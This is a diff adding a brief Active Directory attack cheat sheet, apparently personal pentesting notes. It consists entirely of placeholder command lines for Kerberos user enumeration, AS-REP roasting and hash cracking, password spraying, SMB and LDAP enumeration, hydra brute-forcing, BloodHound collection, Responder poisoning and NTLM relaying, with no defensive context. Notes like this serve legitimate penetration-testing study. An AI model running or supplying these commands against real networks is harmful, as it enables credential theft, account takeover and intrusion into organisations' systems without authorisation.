@@ -1,0 +1,35 @@
+1AD user
+
+Kerberos Pre-Authentication Attacks
+kerbrute userenum -d <domain> --dc <IP> <username_list>
+
+ASREPRoast (No Pre-Auth Required)
+GetNPUsers.py <domain>/<username> -no-pass -dc-ip <IP>
+
+hashcat -m 18200 hash.txt wordlist.txt
+
+ Password Spraying
+crackmapexec smb <IP> -u <username> -p "Password123!"
+
+SMB and NTLM Attacks
+smbclient -L //<IP> -U ""
+
+LDAP Enumeration
+ldapsearch -x -h <IP> -b "DC=<domain>,DC=com" "(sAMAccountName=<username>)"
+
+
+
+Brute-Forcing Passwords
+hydra -L usernames.txt -P passwords.txt smb://<IP>
+
+Leveraging Misconfigurations
+bloodhound-python -u <username> -p '' -d <domain> -c all --dc <IP>
+
+
+Monitor and Relay Authentication Requests
+sudo responder -I eth0
+
+
+ntlmrelayx.py -tf targets.txt -smb2support
+
+
